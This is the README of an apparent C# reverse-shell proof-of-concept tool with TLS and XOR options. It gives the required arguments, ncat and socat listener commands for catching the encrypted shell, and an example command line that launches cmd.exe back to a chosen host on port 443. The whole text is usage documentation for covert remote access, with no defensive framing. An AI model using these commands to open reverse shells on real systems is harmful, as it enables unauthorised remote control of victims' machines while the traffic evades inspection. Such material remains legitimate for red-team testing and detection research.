# csharp_reverse_shell
c# reverse shell poc that also does TLS

Specify host, port, command, arguments, int XOR

Catch it with ncat --ssl or socat openssl-listen:443,cert=cert.pem,verify=0 

All arguments are required,

e.g > csharp_reverse_shell.exe host 443 %comspec% "" 00
